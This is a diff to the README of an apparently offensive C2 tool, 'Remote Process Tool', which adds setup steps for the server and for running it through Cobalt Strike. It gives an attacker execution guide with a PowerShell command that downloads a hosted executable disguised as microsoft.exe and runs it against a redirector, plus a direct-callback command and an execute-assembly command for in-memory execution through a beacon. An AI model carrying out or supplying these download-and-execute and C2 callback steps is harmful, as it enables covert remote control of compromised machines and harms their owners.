@@ -1,5 +1,9 @@
-# Remote Process Tool Setup Guide
+# Remote Process Tool
+	Remote Process Tool is a C# .Net Core Server and .Net Framework Client
+	The tool can be staged to be run in targets memory
+	The tool can also be executed through a Cobalt Strike beacon
 
+# C2 Server Setup
 # Linux Server Guide
 
 	- Linux server ELF is found in Server/linux-x64/publish/DLServer
@@ -27,11 +31,16 @@
 	- If you are doing a straight callback to your server run the command ".\microsoft.exe [your_ip] [your_port]" *Note this is not recommended*
 
 
-# Attacker Execution Guide
+# Attacker Execution Guide (No Cobalt)
 
 	- Setup your redirector to listen and forward to your DLServer
 
 	- Host the windows executable on a HTTP server
 
 	- Run the following command on the client to download and execute:
-		"Invoke-WebRequest "hosted_exe" -OutFile microsoft.exe;.\microsoft.exe [redirector_ip] [redirector_port]" or do whatever you want
+		"Invoke-WebRequest "hosted_exe" -OutFile microsoft.exe;.\microsoft.exe [server/redirector ip] [server/redirector port]" or do whatever you want
+
+# Cobalt Beacon Guide
+
+	- Once you have a beacon you may execute the following Cobalt command to run the executable in memory:
+		"execute-assembly [location_to_exe] [server/redirector ip] [server/redirector port]" 	
